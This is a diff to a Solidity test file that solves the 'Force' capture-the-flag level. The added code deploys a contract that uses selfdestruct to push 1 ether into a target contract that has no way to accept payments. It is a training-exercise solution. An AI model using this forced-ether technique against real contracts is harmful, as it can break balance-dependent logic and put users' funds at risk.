@@ -17,5 +17,15 @@ contract ForceLevel is SetUpLevelTest {
         force = Force(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        ForceAttack forceAttack = new ForceAttack();
+        forceAttack.destroy{value: 1 ether}(address(force));
+        vm.stopPrank();
+    }
+}
+
+contract ForceAttack {
+    function destroy(address _addr) public payable {
+        selfdestruct(payable(_addr));
     }
 }
